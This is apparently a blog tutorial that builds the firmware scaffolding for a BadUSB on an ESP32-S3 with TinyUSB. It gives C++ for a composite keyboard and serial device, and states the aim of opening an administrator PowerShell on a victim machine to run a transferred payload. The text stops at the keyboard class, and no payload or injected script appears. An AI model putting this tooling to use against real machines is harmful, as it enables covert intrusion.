---
title: "How to BadUSB (without a Rubber Ducky)"
date: 2025-07-21 19:50:15 +0100
categories: [Offensive Security, Development]
tags: [malware, code injection, programming, tutorial, cybersecurity, offensive security, badusb]
---

# Abstract

This post will show an implementation of a BadUSB without a "RubberDucky". The BadUSB attack takes advantage of the fact that USB Human Interface Device (HID) keyboards are trusted by the operating system by default. Since the operating system trusts them, they are auto activated once plugged in. This means that the USB specifications keycodes that are normally sent when activating switches on the keyboard, can instead be sent through software.

BadUSB's are commonly created with a physical appearance that mimics that of a USB Mass Storage Device Class (MSC). This is to trick victims into plugging it in, by playing on their curiosity. This post will create a custom firmware for the ESP32-S3 microcontroller and leverage "TinyUSB". TinyUSB is an open source library that implements the USB specification and is *not* ESP32 specific. It should therefore be trivial to translate the code to other microcontrollers.

# Table of Contents

- [1. Brief Explanation of BadUSB](#1-brief-explanation-of-badusb)
- [2. Initializing the USB Driver](#2-initializing-the-usb-driver)
    - [2.1. Driver Implementation](#21-driver-implementation)
        - [2.1.1. Device Descriptor](#211-device-descriptor)
        - [2.1.2. String Descriptors](#212-string-descriptors)
        - [2.1.3. Configuration Descriptor](#213-configuration-descriptor)
        - [2.1.4. Finishing Touches](#214-finishing-touches)
- [3. Device Classes](#3-device-classes)
    - [3.1. Device Class: HID](#31-device-class-hid)
        - [3.1.1. HID Callbacks](#311-hid-callbacks)
    - [3.2. Device Class: CDC](#32-device-class-cdc)
- [4. Logical Keyboard](#4-logical-keyboard)
    - [4.1. Layout Interface](#41-layout-interface)
        - [4.1.1. Concrete Layout](#411-concrete-layout)
    - [4.2. Keyboard Implementation](#42-keyboard-implementation)
        - [4.2.1. Key and Modifier Code](#421-key-and-modifier-code)
        - [4.2.2. Reporting Codes to TinyUSB](#422-reporting-codes-to-tinyusb)
        - [4.2.3. Pressing Keys](#423-pressing-keys)
        - [4.2.4. Jittered Delay](#424-jittered-delay)
        - [4.2.5. Writing ASCII Characters](#425-writing-ascii-characters)
        - [4.2.6. Accessing PowerShell](#426-accessing-powershell)
- [5. Transferring the Payload](#5-transferring-the-payload)
    - [5.1. Injected PowerShell Script](#51-injected-powershell-script)
        - [5.1.1. Removing Whitespace](#511-removing-whitespace)
    - [5.2. Responding to the Handshake Request](#52-responding-to-the-handshake-request)
        - [5.2.1. Reading and Writing Over CDC](#521-reading-and-writing-over-cdc)
    - [5.3. The Payload](#53-the-payload)
        - [5.3.1. From Executable to Array](#531-from-executable-to-array)
        - [5.3.2. Sending the Payload](#532-sending-the-payload)

# 1. Brief Explanation of BadUSB

There are multiple ways of creating a BadUSB. One way is to find a legitimate USB device (such as a storage device) which firmware is vulnerable. Making it possible to reprogram it. The main benefit of this would be that the final device appears as a legitimate USB device (since it used to be). The downside of course is that its easier said then done to find a device with vulnerable firmware.

If the end goal is to create a BadUSB that mimics that of a traditional USB storage device. Then it would be much simpler to create one yourself from scratch. This is trivial today as custom PCB's can be ordered online for a few euros, and the USB "chassi" can just be 3D printed. Going this route would give full control of the firmware to the attacker. This is much simpler and gives more control over the end result, so it should be preferred. 

When it comes to what *type* of device can be considered a BadUSB, it can really be anything that is defined by the USB specification. Most common would arguably be a HID. In terms of legitimate USB devices, this could be a keyboard, a mouse or a joystick (to name a few). This is what the known "Rubber Ducky" uses. It could also be a MSC, this is what a hacked legitimate USB storage device would appear as. The reprogrammed firmware would behave in such a way that it copies a payload from storage to the host.

The beauty (or ugly depending on how you look at it) of the USB specification is that it allows for something called a *composite device*. What this means is that a USB device doesn't have to be just *one* device class. In other words, a USB device could be a HID and a MSC. A MSC and Communication Device Class (CDC). A MSC, HID and CDC etc. This is very powerful since it makes it possible to mimic a keyboard (HID) and use keyboard shortcuts to open a terminal as administrator and then copy a Malware payload from storage (MSC). 

Leveraging a composite device is what will be done in this tutorial. HID will be used to mimic a keyboard, which will open an administrator terminal. It will then use the terminal to open a serial communication to the USB device. The second device class will therefore be CDC, instead of MSC. In other words, the payload will be transferred over serial communication. Once the payload has been transferred the terminal will execute it (with administrator rights). 

# 2. Initializing the USB Driver

The first step is to initialize the USB driver. Espressif has already provided a thin wrapper to initialize and de-initialize TinyUSB which is convenient, `tinyusb_driver_install(const tinyusb_config_t*)` and `tinyusb_driver_uninstall()`. Which makes it trivial to create a RAII wrapper around this.

It's the `tinyusb_config_t` struct that contains the data that describes the actual specifics. The USB specification version, the vendor id. Whether or not it should be initialized as CDC, MSC, HID etc. There are primarily three descriptors that needs to be filled out. The device descriptors, the configuration descriptors and the string descriptors.

The device descriptors contain information about the device itself. Such as what USB specification version that is used. The vendor and product id. It also specifies indices to some of the string descriptors (more on this later).

The configuration descriptors hold the information about a specific device class. To clarify, a USB device class is the actual type. I.e. MSC, CDC, HID etc. The configuration descriptor for a HID device would contain information about the interface used, the polling rate etc.

The string descriptors contain various strings, such as name of the manufacturer, name of the product, specific string per device class and so on. These are all stored in an array and the index to the specific string is specified in the device or configuration descriptors. These descriptors all hold data that are known at compile time. Thus there is little to no need to initialize it at runtime. So the implementation should take advantage of C++ compile time programming features.

## 2.1. Driver Implementation

The driver type should simply look something like this: `Driver<HID> d{}`, and for composite devices `Driver<HID, CDC> d{}` or `Driver<CDC, HID> d{}` (any order). Since the number of device classes are `1 to N` a variadic template is required.

````c++
template<typename... device_class_t>
class Driver
{
    ...
};
````

It's an RAII wrapper so the constructor and destructor should call the correct initialization and free functions.

````c++
Driver::Driver()
{
    tinyusb_driver_install(const tinyusb_config_t*);
}
Driver::~Driver()
{
    tinyusb_driver_uninstall();
}
````

Before calling `tinyusb_driver_install(const tinyusb_config_t*)`. Like mentioned earlier, the config type has to be initialized with the correct descriptors. To make sure they are initialized at compile time they should be returned from `consteval` functions. 

### 2.1.1. Device Descriptor

The device descriptor is a struct `tusb_desc_device_t` and the easiest to fill out. As its possible to just specify the data, without requiring any data that is specific to the device classes. The vendor and product ID is specified here, as well as some of the indices to the string descriptors.

````c++
template<typename... device_class_t>
class Driver
{
    static consteval tusb_desc_device_t make_dev_descriptor()
    {
        uint16_t vendorID = 0xDE'AD;
        uint16_t productID = 0x13'37;
        uint16_t bcdDevice = 0x01'00;

        uint8_t manufacturerIndex = 1;
        uint8_t productIndex = 2;
        uint8_t serialIndex = 3;

        return tusb_desc_device_t{
            .bLength = sizeof(tusb_desc_device_t),
            .bDescriptorType = TUSB_DESC_DEVICE,
            .bcdUSB = 0x02'00,    // USB specification version - 2.0
            .bDeviceClass = TUSB_CLASS_MISC,
            .bDeviceSubClass = MISC_SUBCLASS_COMMON,
            .bDeviceProtocol = MISC_PROTOCOL_IAD,
            .bMaxPacketSize0 = CFG_TUD_ENDPOINT0_SIZE,
            .idVendor = vendorID,
            .idProduct = productID,
            .bcdDevice = bcdDevice,    // Device's firmware version - 1.0
            // String descriptor indices
            .iManufacturer = manufacturerIndex,
            .iProduct = productIndex,
            .iSerialNumber = serialIndex,
            .bNumConfigurations = 1
        };
    }

    ...

    tinyusb_config_t m_Config;
    tusb_desc_device_t m_DevDescriptor;
};
````

The function should be static because it cannot use the `__thiscall` calling convention. This is because the `this` pointer cannot be used in a constant evaluation context.

To generate the device descriptors at compile time in the constructor it can simply be called in the initializer list.

````c++
template<typename... device_class_t>
class Driver
{
    Driver::Driver()
        : m_Config{}
        , m_DevDescriptor{ make_dev_descriptor() }
    {
        tinyusb_driver_install(&m_Config);
    }
    ...
    tinyusb_config_t m_Config;
    tusb_desc_device_t m_DevDescriptor;
};
````

### 2.1.2. String Descriptors

The configuration and string descriptors are a little more tricky. The configuration descriptor is actually just an array of raw bytes (uint8_t) and the string descriptor are an array of c strings (const char*). But because these are of varying sizes (as they depend on what device classes the Driver class is specialized with). The size of these stack allocated arrays (std::array<>) has to be computed at compile time as well.

Out of these two the string descriptor is the most straight forward. On top of the 4 default strings (Language, Manufacturer Name, Product Name and Serial Number), each device class will add its own string. Thus the size of the string descriptor are `4 + num device classes`. All that is required then is to count the number of device classes the Driver class was specialized with.

````c++
template<typename... device_class_t>
class Driver
{
    static constexpr std::size_t NUM_DEV_DESC_STRINGS = 4;
    static consteval std::size_t str_desc_size()
    {
        return NUM_DEV_DESC_STRINGS + sizeof ... (device_class_t);
    }
    using StringDescArray = std::array<const char*, str_desc_size()>;

    ...

    tinyusb_config_t m_Config;
    tusb_desc_device_t m_DevDescriptor;
    StringDescArray m_StrDescriptor;
};
````

With the size of the array calculated, the next step is to add the actual C strings to it. Adding the device strings is trivial and can be hard set.

````c++
template<typename... device_class_t>
class Driver
{
    static constexpr std::array<char, 2> ENGLISH{ 0x09, 0x04 };
    static consteval uint8_t first_dev_class_str_index()
    {
        return NUM_DEV_DESC_STRINGS;
    }
    static consteval StringDescArray default_str_descriptors()
    {
        return { ENGLISH.data() , "Manufacturer String", "Product String", "Serial Number String" };
    }
};
````

The *Manufacturer String*, *Product String* and *Serial Number String* can be whatever you want, in any order. Just make sure the indices provided to the device descriptor matches, see [Device Descriptor](#211-device-descriptor). The first entry (index 0) should contain the language ID. The language ID is a two byte long value that is specified by the USB specification. It exist to represent what language/locale the USB device supports. Here 0x0409 (stored in little endian) represent US English.

Lastly the code just have to query the device class specific string descriptor and add it to the array of descriptors. This can be solved at compile time by applying a lambda to each type through fold expressions.

````c++
template<typename... device_class_t>
class Driver
{
    static consteval StringDescArray make_str_desc()
    {
        StringDescArray strDesc = default_str_descriptors();
        uint8_t strIndex = first_dev_class_str_index();
        ([&strDesc, &strIndex] ()
        {
            strDesc[strIndex] = device_class_t::str_descriptor();
            ++strIndex;
        }(), ...);

        return strDesc;
    }
};
````

It's also a good idea to add a concept. That will make sure that the provided device class(es) that the Driver is specialized with contains the expected function.

````c++
template<typename device_class_t>
concept device_class = requires()
{
    { device_class_t::str_descriptor() } -> std::same_as<const char*>;
};

template<typename... device_class_t>
requires (device_class<device_class_t> && ...)
class Driver
{
    ...
};
````

With that done the string descriptors can be generated at compile time in the constructor like so:

````c++
template<typename... device_class_t>
requires (device_class<device_class_t> && ...)
class Driver
{
    Driver::Driver()
        : m_Config{}
        , m_DevDescriptor{ make_dev_descriptor() }
        , m_StrDescriptor{ make_str_desc() }
    {
        tinyusb_driver_install(&m_Config);
    }
    ...
    tinyusb_config_t m_Config;
    tusb_desc_device_t m_DevDescriptor;
    StringDescArray m_StrDescriptor;
};
````

### 2.1.3. Configuration Descriptor

Like mentioned, the configuration descriptor is the descriptor that holds the information for the specific device class(es). This descriptor is stored in a an array of bytes (uint8_t). The first (main) part of the array contains data about the configuration in general. Such as how many interfaces are available, or how much power (in milli ampere) the USB device require. 

After this "main" part of the configuration descriptor, the data specific to each `device_class_t` is appended. This means that the final size of the stack allocated array containing the configuration descriptor has to be calculated, just like the array containing the string descriptors. 

````c++
template<typename... device_class_t>
requires (device_class<device_class_t> && ...)
class Driver
{
    static consteval std::size_t cfg_desc_size()
    {
        static_assert(((device_class_t::cfg_desc_size() > 0) && ...), "Device class has a configuration descriptor of size 0.");
        return CONFIG_DESC_LEN + (device_class_t::cfg_desc_size() + ...);
    }
    using ConfigDescArray = std::array<uint8_t, cfg_desc_size()>;
};
````

Lets also add the expected function to the concept created earlier.

````c++
template<typename device_class_t>
concept device_class = requires()
{
    { device_class_t::cfg_desc_size() } -> std::same_as<std::size_t>;
    { device_class_t::str_descriptor() } -> std::same_as<const char*>;
};
````

Most of this data for the "main" part of the configuration descriptor can be just hard set. But for the number of required interfaces this too has to be calculated from the provided `device_class_t` that the Driver class is specialized with. Thankfully fold expressions can be used to cleanly sum up the number of required interfaces.

````c++
template<typename... device_class_t>
requires (device_class<device_class_t> && ...)
class Driver
{
    static consteval uint8_t iface_count()
    {
        return (device_class_t::num_required_ifaces() + ...);
    }
};
````

Lets not forget to add the expected function to the concept.

````c++
template<typename device_class_t>
concept device_class = requires()
{
    { device_class_t::cfg_desc_size() } -> std::same_as<std::size_t>;
    { device_class_t::str_descriptor() } -> std::same_as<const char*>;
    { device_class_t::num_required_ifaces() } -> std::same_as<std::uint8_t>;
};
````

Creating the "main" configuration descriptor would then look like this:

````c++
template<typename... device_class_t>
requires (device_class<device_class_t> && ...)
class Driver
{
    static consteval ConfigDescArray default_cfg_descriptor()
    {
        constexpr uint8_t configNumber = 1u;
        constexpr uint8_t cfgStrIndex = 0u;
        constexpr uint8_t attribute = TUSB_DESC_CONFIG_ATT_REMOTE_WAKEUP;
        constexpr uint8_t powerMa = 100;

        return ConfigDescArray{
            TUD_CONFIG_DESCRIPTOR(configNumber, iface_count(), cfgStrIndex, cfg_desc_size(), attribute, powerMa) };
    }
};
````

The configuration number is hard set to 1 here because the number of configurations was set to 1 in the device descriptor, see [Device Descriptor](#211-device-descriptor). It is possible to use multiple configurations, but that's not going to be needed for this project.

Now for the device class specific data that has to be appended to finalize the configuration descriptor. It has to be queried from each `device_class_t`. But because this data require the index to where their respective string descriptor (for that `device_class_t`) is stored, that index has to be calculated again. The string index can then be passed as a parameter in order to allow each `device_class_t` to return the data to be appended. To keep things simple it will return a stack allocated array of uint8. The data in that array can then just be copied into the Driver's array that contain the configuration descriptor. Remember that this is constant evaluated (compile time execution) so none of this code is executed during run time.

````c++
template<typename... device_class_t>
requires (device_class<device_class_t> && ...)
class Driver
{
    static constexpr std::size_t CONFIG_DESC_LEN = TUD_CONFIG_DESC_LEN; // tinyusb macro
    static consteval ConfigDescArray make_cfg_desc()
    {
        uint8_t strIndex = first_dev_class_str_index();
        ConfigDescArray configDescriptor = default_cfg_descriptor();
        auto insertIter = std::begin(configDescriptor) + CONFIG_DESC_LEN;
        ([&insertIter, &strIndex] ()
        {
            const auto& descriptor = device_class_t::cfg_descriptor(strIndex);
            insertIter = std::copy(std::begin(descriptor), std::end(descriptor), insertIter);
            ++strIndex;
        }(), ...);

        return configDescriptor;
    }
};
````

Lets also add the expected function to the concept.

````c++
template<typename device_class_t>
concept device_class = requires()
{
    { device_class_t::cfg_desc_size() } -> std::same_as<std::size_t>;
    { device_class_t::cfg_descriptor(std::declval<uint8_t>()) } -> std::same_as<std::array<uint8_t, device_class_t::cfg_desc_size()>>;
    { device_class_t::str_descriptor() } -> std::same_as<const char*>;
    { device_class_t::num_required_ifaces() } -> std::same_as<std::uint8_t>;
};
````

The configuration descriptors can now be instantiated like so:

````c++
template<typename... device_class_t>
requires (device_class<device_class_t> && ...)
class Driver
{
    Driver::Driver()
        : m_Config{}
        , m_DevDescriptor{ make_dev_descriptor() }
        , m_CfgDescriptor{ make_cfg_desc() }
        , m_StrDescriptor{ make_str_desc() }
    {
        tinyusb_driver_install(&m_Config);
    }
    ...
    tinyusb_config_t m_Config;
    tusb_desc_device_t m_DevDescriptor;
    ConfigDescArray m_CfgDescriptor;
    StringDescArray m_StrDescriptor;
};
````

### 2.1.4. Finishing Touches

There are two more things that has to be done. Firstly the `tinyusb_config_t` object passed to `tinyusb_driver_install` has to know where the Device, Configuration and String descriptors are located. This is simply done in the constructor.

````c++
template<typename... device_class_t>
requires (device_class<device_class_t> && ...)
class Driver
{
    Driver::Driver()
        : m_Config{}
        , m_DevDescriptor{ make_dev_descriptor() }
        , m_CfgDescriptor{ make_cfg_desc() }
        , m_StrDescriptor{ make_str_desc() }
    {
        m_Config.device_descriptor = &m_DevDescriptor;
        m_Config.string_descriptor = m_StrDescriptor.data();
        m_Config.string_descriptor_count = static_cast<int32_t>(m_StrDescriptor.size());
        m_Config.configuration_descriptor = m_CfgDescriptor.data();

        tinyusb_driver_install(&m_Config);
    }
    ...
    tinyusb_config_t m_Config;
    tusb_desc_device_t m_DevDescriptor;
    ConfigDescArray m_CfgDescriptor;
    StringDescArray m_StrDescriptor;
};
````

Secondly, some device classes actually have their own initialization function that they have to call. For example CDC has to call `tusb_cdc_acm_init(const tinyusb_config_cdcacm_t* cfg)`. The simplest way to solve this is to simply add another requirement to the `device_class` concept - a `init()` function.

````c++
template<typename device_class_t>
concept device_class = requires()
{
    { device_class_t::cfg_desc_size() } -> std::same_as<std::size_t>;
    { device_class_t::cfg_descriptor(std::declval<uint8_t>()) } -> std::same_as<std::array<uint8_t, device_class_t::cfg_desc_size()>>;
    { device_class_t::str_descriptor() } -> std::same_as<const char*>;
    { device_class_t::num_required_ifaces() } -> std::same_as<std::uint8_t>;
    { device_class_t::init() } -> std::same_as<esp_err_t>;
};
````

Then in the constructor each `device_class_t`'s init function can be called using fold expressions.

````c++
template<typename... device_class_t>
requires (device_class<device_class_t> && ...)
class Driver
{
    Driver::Driver()
        : m_Config{}
        , m_DevDescriptor{ make_dev_descriptor() }
        , m_CfgDescriptor{ make_cfg_desc() }
        , m_StrDescriptor{ make_str_desc() }
    {
        m_Config.device_descriptor = &m_DevDescriptor;
        m_Config.string_descriptor = m_StrDescriptor.data();
        m_Config.string_descriptor_count = static_cast<int32_t>(m_StrDescriptor.size());
        m_Config.configuration_descriptor = m_CfgDescriptor.data();

        tinyusb_driver_install(&m_Config);

        ([this]()
        {
            if (esp_err_t err = device_class_t::init(); err != ESP_OK)
            {
                LOG_ERR("Device Class initialization failed with: \"{}\"", esp_err_to_name(err));
            }
        }(), ...);
    }
    ...
    tinyusb_config_t m_Config;
    tusb_desc_device_t m_DevDescriptor;
    ConfigDescArray m_CfgDescriptor;
    StringDescArray m_StrDescriptor;
};
````

# 3. Device Classes

The next step is to add the device classes. Specifically CDC and HID (keyboard) which will be required before moving on. Their implementation really only boils down to providing the functions that the Driver expects from its template arguments (enforced by the device_class concept), see [Finishing Touches](#214-finishing-touches). 

All these functions do is to provide access to constant data. Data that is requried to create that device class' descriptors. E.g. the byte length of the descriptors, what its string is and so on.

## 3.1. Device Class: HID 

Most of this should be self explanatory at this point. The magic numbers in `cfg_descriptor(uint8_t)` deserves an explanation however. 

The interface number is exactly what its name suggest - the number of the interface that will be used (0 is first, 1 is second etc). The boot protocol affects how the host and the device will communicate. I.e. what data is expected from and received to the HID callbacks. These callbacks are explained in more detail in the next section.

The endpoint address represents two options. First whether or not the direction is IN or OUT. Secondly, which endpoint number to use. The most significant bit is responsible for the direction. If that bit is 1 (i.e. 0x80), then the direction is IN - otherwise its OUT. The 4 least significant bits represent the endpoint number. In this case, its IN endpoint 3 (0x83). A USB interface can have multiple endpoints. E.g. a joystick may use endpoint 1 to report position and endpoint 2 to report the state of buttons.

Size is simply the size of the packets send over the endpoint. In this case its 16 bytes. Polling interval is exactly as it sounds - the rate (in ms) that the host will poll the USB device at.


````c++
class HID
{
  static constexpr std::size_t cfgSize = CFG_TUD_HID * TUD_HID_DESC_LEN;
  static constexpr std::string_view strDescriptor = "HID String";
  static constexpr std::array<uint8_t, 67> reportDescriptor{ TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(HID_ITF_PROTOCOL_KEYBOARD)) };
public:
  static constexpr const uint8_t* report_descriptor() { return reportDescriptor.data(); }
  static constexpr const char* str_descriptor() { return strDescriptor.data(); }
  static constexpr std::size_t cfg_desc_size() { return cfgSize; }
  static constexpr std::array<uint8_t, cfgSize> cfg_descriptor(uint8_t strIndex)
  {
    // Interface number, string index, protocol, report descriptor len, EP In address, size & polling interval
    uint8_t ifaceNum = 0;
    uint8_t bootProtocol = 0;   // report protocol
    uint8_t reportDescSize = static_cast<uint8_t>(reportDescriptor.size());
    uint8_t endpointInAddress = 0x83;
    uint8_t size = 16;
    uint8_t pollingInterval = 10;

    return { TUD_HID_DESCRIPTOR(ifaceNum, strIndex, bootProtocol, reportDescSize, endpointInAddress, size, pollingInterval) };
  }
  static constexpr uint8_t num_required_ifaces() { return 1; }
  static esp_err_t init()
  { return ESP_OK; }
};
````

Since HID does not require any special function to be called at runtime in order to initiate it. Its `init()` function will simply return `ESP_OK`.

### 3.1.1 HID Callbacks

TinyUSB expects us to implement the definitions of these callbacks ourselves (instead of passing a long a pointer). For our case, the definitions we require are 

* `uint8_t const *tud_hid_descriptor_report_cb(uint8_t instance)`
* `uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t* buffer, uint16_t reqlen)`
* `void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t const* buffer, uint16_t bufsize)`

The first one is responsible for informing the host (the computer the USB device is connected to) about the capabilities of the USB device. This usually happens when the host is enumerating the USB device to find out what to expect from it. Its straight forward to implement and will look like this

````c++
uint8_t const *tud_hid_descriptor_report_cb(uint8_t instance)
{
    return usb::HID::report_descriptor();
}
````

The second callback is invoked when the host requests a snapshot of the USB device's current state. This could be the position of a joystick for example. For our purposes this is not needed, so the function will simply return 0. This informs the host that the requests can't be honoured.

````c++
uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t* buffer, uint16_t reqlen)
{
    uint16_t STALL = 0;
    return STALL;
}
````

The third and final callback will update (set) the state of the USB device. This could be the LED on the Caps Lock key for example. This is also something that will not be used. However, it still has to be defined. It will simply have an empty function body.

````c++
void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t const* buffer, uint16_t bufsize)
{}
````

All in all you can think of a "report" as a packet that is sent back and fourth between the host and the USB device. There are three types of "reports", input, output and feature. Input reports are from the USB device to the host and could contain for example keycodes. Output reports which are the opposite, from the host to the USB device. E.g. reading the state of the Caps Lock LED. Lastly there is the feature report. This is bidirectional and are used to configure the USB device.


## 3.2. Device Class: CDC

Next up is the Communications Device Class. Again, this is mainly about implementing the functions that the Driver expects. These function are for the most part just returning data (like before). 

First off is the interface number again. This is then followed by endpoint information, and works just as explained in [Device Class: HID](#31-device-class-hid). In other words, the `epNotificationAddress` indicates that this is *IN endpoint 1*. Notifications in this context refers to line state changes. This controls the data communication. E.g. the device can notify the host with a Clear To Send (CTS), which tell the host that its ready to start receiving data.

The main communication (data transfer) happens on endpoint 2. As indicated by the last three variables.


````c++
using PFN_cdc_callback = void (*)(int interface, cdcacm_event_t* pEvent);

class CDC
{
    static constexpr std::size_t cfgSize = CFG_TUD_CDC * TUD_CDC_DESC_LEN;
    static constexpr std::string_view strDescriptor = "CDC String";
public:
    static constexpr std::size_t cfg_desc_size() { return cfgSize; };
    static constexpr std::array<uint8_t, cfgSize> cfg_descriptor(uint8_t strIndex)
    {
        uint8_t iface = 1;
        uint8_t epNotificationAddress = 0x81;
        uint8_t epNotificationSize = 8;
        uint8_t epOut = 0x02;
        uint8_t epIn = 0x82;
        uint8_t epSize = 64;
        return {
            TUD_CDC_DESCRIPTOR(iface, strIndex, epNotificationAddress, epNotificationSize, epOut, epIn, epSize) };
    }
    static constexpr const char* str_descriptor() { return strDescriptor.data(); }
    static constexpr uint8_t num_required_ifaces() { return 2; }
    static consteval tinyusb_cdcacm_itf_t acm_interface(){ return TINYUSB_CDC_ACM_0; }
    static esp_err_t init();
    static void register_rx_callback(PFN_cdc_callback callable);
};
````

The callbacks that are used by CDC controls what to do with the incoming data, and what do do about line state changes. For this project, all that is really needed is to implement the callback that handles incoming data. The callback is stored in an internally linked variable inside the CDC translation unit. This will make it possible to update the callback during runtime, and the Driver class will not have to store a CDC object.

````c++
usb::PFN_cdc_callback pfn_rx_callback = [](int interface, cdcacm_event_t* pEvent){ LOG_INFO("Register a rx callback by calling set_cdc_rx_callback() from the driver object."); };
````

Registering the callback could be a free function, but since the CDC type already serves as a glorified namespace (thanks to the `consteval` functions). It might as well be defined in there also.

````c++
void CDC::register_rx_callback(PFN_cdc_callback callable)
{
    pfn_rx_callback = callable;
}
````

To make the API a little bit more convenient, and make sure that basic errors are detected at compile time. The Driver type should expose a function to set the CDC callbacks. This makes it also possible to check whether or not the Driver has been instantiated as a CDC device or not.

````c++
void set_cdc_rx_callback(PFN_cdc_callback callable)
{
    static_assert((std::same_as<device_class_t, CDC> || ...), "To use CDC callbacks the Driver has to   be instantiated as a CDC device");
    CDC::register_rx_callback(callable);
}
````

Finally the init function. CDC requires a function call to be made at runtime. This is where what USB device on the microcontroller to use and which port. It also sets the size of the buffer that will store incoming data (before our program reads it). Its also possible to set the pointers to the callbacks here.

````c++
esp_err_t CDC::init()
{
    tinyusb_config_cdcacm_t cdcConfig{
        .usb_dev = TINYUSB_USBDEV_0,
        .cdc_port = acm_interface(),
        .rx_unread_buf_sz = 64,
        .callback_rx = pfn_rx_callback,
        .callback_rx_wanted_char = nullptr,
        .callback_line_state_changed = nullptr,
        .callback_line_coding_changed = nullptr
    };
    return tusb_cdc_acm_init(&cdcConfig);
}
````

# 4. Logical Keyboard

The easiest way to add a PowerShell script to execute would arguably be to store the script in one big string. This would make it so in order to output the script to the victim machine's terminal, all it would take is:

````c++
usb::Keyboard keyboard{};
std::string script = "$s = \"hello\"; echo $s";
for (auto&& c : script)
    keyboard.press_key(c);
````

The problem with this however is that these would be ascii characters. The thing about the USB keycodes are that they map to physical switches on the keyboard, thus it is not as simple to go from ascii `A` to the USB output of `A`. This is of course because of the keyboard language layout. The same letters are mapped to different physical switches based on this layout.

In order to implement this type of function signature, it would require a keyboard abstraction that can be initialized with the different layouts. The keyboard abstraction would then retrieve which physical switch(es) are required to be pressed for whatever ascii character it's trying to output. Which means that each different layout would have to be implemented. This is quite a tedious process if done manually, considering there are 95 ascii characters.

Its worth mentioning that this *can* be solved dynamically through the Win32 API by calling `MapVirtualKeyExA` with the argument `MAPVK_VK_TO_VSC`. However, in order to solve this dynamically by executing some code on the target machine. It is still required to first send input in order to get the code onto the target machine and execute it. Thus the layout is still required at compile time.

With that said, if multiple layouts are required. A script should be written that will auto generate the required header files (all the layouts you need). This way its possible to support hundreds of layouts, without having to write them manually. This is not something that will be covered by this blog post. But that I intend to cover in the future. For now, only a single layout will be implemented.

There are multiple ways a translation like this can be done. One way is to use CRTP, where the keyboard abstraction as a base class and the language layout is the derived class. However, since its possible to support hundreds of layouts it is a good idea to avoid templates since this would massively bloat the binary. Instead this will be implemented with dynamic dispatch. Which will incur a small execution cost, but is worth it compared to the potential binary size cost of that many templates.

One thing to know before getting started is how these keycodes work. In simple terms, the USB host controller will on regular intervals poll the keyboard for any key presses/releases. These key presses comes in the form of keycodes (as mentioned previously), but there are also a modifier code. This modifier code refers to keys such as `ALT` or `SHIFT`. While a keycode (say 0x40) refers to the physical switch for `1`. It is the addition of the modifier keycode of the `SHIFT` key that tell the operating system that the output should be `!`. In other words; *SHIFT + 1*.

With this in mind and the fact that all writable ascii characters are adjacent to each other. The easiest way to map an ascii character to its correct keycode and (optional) modifier code is with a big lookup table.

The writable ascii characters lie between 32-126. So by subtracting them by 32, its possible to obtain a 0-based index into a table (array). The values stored in this table will hold the keycode and the modifier. In order to avoid using types like pairs, this will be stored in a single `uint16`. The eight least significant bits will contain the keycode. The 8 most significant will contain the modifier.

## 4.1. Layout Interface

The first step here isn't strictly necessary. That is to turn TinyUSB's `#defines` into `enum class`'s. However, I do believe its a good idea to uphold type saftey whenever possible. So to do that, two `enum class`'s are required. One for the modifier code and one for the keycode.

````c++
enum class KeyModifier : uint8_t
{
    NONE        = 0,
    LEFTCTRL    = KEYBOARD_MODIFIER_LEFTCTRL,
    /* ... */
    RIGHTGUI    = KEYBOARD_MODIFIER_RIGHTGUI
};
enum class Keycode : uint8_t
{
    NONE = HID_KEY_NONE,
    A = HID_KEY_A,
    /* ... */
    CMD_RIGHT = HID_KEY_GUI_RIGHT
};
````

Lets then add the Layout base class and its virtual destructor. Lets also add a helper function that merges the two codes into a single `uint16_t`. Which can be used by the concrete implementations later.

````c++
class Layout
{
public:
    virtual ~Layout() = default;
protected:
    constexpr uint16_t make_key_code(KeyModifier modifier, Keycode keycode) const
    {
        using underlying_modifier_t = std::underlying_type_t<KeyModifier>;
        using underlying_keycode_t = std::underlying_type_t<Keycode>;
        uint16_t code = static_cast<underlying_modifier_t>(modifier) << 8;
        return code | static_cast<underlying_keycode_t>(keycode);
    }
};
````

Next up is to add every single ascii character as a pure virtual function that the derived classes has to implemenet.

````c++
class Layout
{
public:
    virtual uint16_t space() const = 0;
    virtual uint16_t exclamation_mark() const = 0;
    // ... All remaining ASCII characters go here
    virtual uint16_t tilde() const = 0;
};
````

### 4.1.1. Concrete Layout

Finally, for each language layout that should be supported. Every ascii character needs to be mapped to its physical switch. This is extremely tedious since its done manually. Unsustainable if you require more than one layout. I.e. these are the header and cpp files that you would generate automatically if support for multiple layouts are required. The class declaration for a layout becomes:

````c++
struct Swedish : public Layout
{
    constexpr uint16_t space() const override;
    constexpr uint16_t exclamation_mark() const override;
    // ... All remaining ASCII characters go here
    constexpr uint16_t tilde() const override;
};
````

The implementation of these will then call `make_key_code(...)` with the keycodes for the correct switches.

````c++
constexpr uint16_t Swedish::space()
{
    return make_key_code(KeyModifier::NONE, Keycode::SPACE);
}
constexpr uint16_t Swedish::exclamation_mark()
{
    return make_key_code(KeyModifier::LEFTSHIFT, Keycode::ONE);
}
// ... All remaining ASCII characters go here
constexpr uint16_t Swedish::tilde()
{
    return make_key_code(KeyModifier::RIGHTALT, Keycode::BRACKET_RIGHT);
}
````

## 4.2. Keyboard Implementation

Lets begin by aliasing the array that will contain the key and modifier codes. In order to make the constructor layout agnostic, it will take a reference to the layout interface.

````c++
using Table = std::array<uint16_t, 95>;
// ...
class AsciiKeyboard
{
public:
    AsciiKeyboard(const Layout& layout);
private:
    Table m_KeycodeTable;
}
````

Next up is a helper function to instantiate our table. This will simply go through each ascii character and insert their respective codes into the table. 

````c++
Table make_table(const Layout& layout)
{
    return Table{
        layout.space(),
        layout.exclamation_mark(),
        // ... All remaining ASCII characters go here
        layout.tilde()
    };
}
````

This function can then be used in the constructor to instantiate the member variable that holds the table. Its a good idea to add an assert that will trigger in debug builds if TinyUSB has not been initiated. Since the keyboard implementation will depend on it.

````c++
AsciiKeyboard::AsciiKeyboard(const layout::Layout& layout)
    : m_KeycodeTable{ make_table(layout) }
{
    ASSERT(tusb_inited());
}
````


